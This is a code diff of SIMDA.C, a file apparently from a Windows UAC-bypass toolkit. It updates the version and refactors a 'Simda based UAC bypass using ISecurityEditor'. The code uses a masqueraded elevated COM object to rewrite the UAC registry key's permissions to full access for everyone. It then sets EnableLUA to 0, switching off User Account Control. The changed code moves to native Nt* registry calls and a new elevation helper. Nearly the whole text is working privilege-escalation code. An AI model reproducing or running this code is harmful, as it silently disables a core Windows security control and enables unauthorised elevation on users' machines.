@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     2.55
+*  VERSION:     2.70
 *
-*  DATE:        08 Feb 2017
+*  DATE:        25 Mar 2017
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -31,23 +31,23 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
     _In_ SECURITY_INFORMATION SecurityInformation,
     _In_ SE_OBJECT_TYPE ObjectType,
     _In_ LPWSTR NewSddl
-    )
+)
 {
     HRESULT          r = E_FAIL;
     BOOL             cond = FALSE;
     IID		         xIID_ISecurityEditor;
     CLSID	         xCLSID_ShellSecurityEditor;
     ISecurityEditor *SecurityEditor1 = NULL;
-    BIND_OPTS3       bop;
-    LPOLESTR         pps;   
+    LPOLESTR         pps;
 
     do {
-        if (CLSIDFromString(T_CLSID_ShellSecurityEditor, &xCLSID_ShellSecurityEditor) != NOERROR) {
-            break;
-        }
-        if (IIDFromString(T_IID_ISecurityEditor, &xIID_ISecurityEditor) != S_OK) {
-            break;
-        }
+        if (CLSIDFromString(
+            T_CLSID_ShellSecurityEditor,
+            &xCLSID_ShellSecurityEditor) != NOERROR) break;
+
+        if (IIDFromString(
+            T_IID_ISecurityEditor,
+            &xIID_ISecurityEditor) != S_OK) break;
 
         r = CoCreateInstance(&xCLSID_ShellSecurityEditor, NULL,
             CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
@@ -56,11 +56,12 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
         if (r != S_OK)
             break;
 
-        RtlSecureZeroMemory(&bop, sizeof(bop));
-        bop.cbStruct = sizeof(bop);
-        bop.dwClassContext = CLSCTX_LOCAL_SERVER;
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_ShellSecurityEditor,
+            CLSCTX_LOCAL_SERVER,
+            &xIID_ISecurityEditor,
+            &SecurityEditor1);
 
-        r = CoGetObject(ISECURITYEDITOR_ELEMONIKER, (BIND_OPTS *)&bop, &xIID_ISecurityEditor, &SecurityEditor1);
         if (r != S_OK)
             break;
 
@@ -76,7 +77,7 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
             ObjectType,
             SecurityInformation,
             &pps
-            );
+        );
 
         if ((r == S_OK) && (pps != NULL)) {
             OutputDebugStringW(pps);
@@ -88,7 +89,7 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
             ObjectType,
             SecurityInformation,
             NewSddl
-            );
+        );
 
         if (r == S_OK) {
             OutputDebugStringW(NewSddl);
@@ -114,29 +115,41 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
 */
 BOOL ucmSimdaTurnOffUac(
     VOID
-    )
+)
 {
-    BOOL    cond = FALSE, bResult = FALSE;
-    DWORD   dwValue;
-    LRESULT lRet;
-    HKEY    hKey;
+    BOOL                bResult = FALSE;
+    HKEY                hKey;
+    DWORD               dwValue;
+    WCHAR               szBuffer[MAX_PATH];
+    UNICODE_STRING      ustr;
+    OBJECT_ATTRIBUTES   obja;
 
-    do {
+    bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
+        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);
 
-        bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
-            DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);
+    if (bResult) {
 
-        if (!bResult) 
-            break;
+        RtlSecureZeroMemory(&ustr, sizeof(ustr));
+        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, L"\\REGISTRY\\");
+        _strcat(szBuffer, T_UACKEY);
+        RtlInitUnicodeString(&ustr, szBuffer);
+        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        if (NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja))) {
 
-        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, T_UACKEY, 0, KEY_ALL_ACCESS, &hKey);
-        if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {
             dwValue = 0;
-            RegSetValueEx(hKey, TEXT("EnableLUA"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
-            RegCloseKey(hKey);
-        }
+            RtlInitUnicodeString(&ustr, L"EnableLUA");
+            bResult = NT_SUCCESS(NtSetValueKey(
+                hKey,
+                &ustr,
+                0,
+                REG_DWORD,
+                (PVOID)&dwValue,
+                sizeof(DWORD)));
 
-    } while (cond);
+            NtClose(hKey);
+        }
+    }
 
     return bResult;
 }
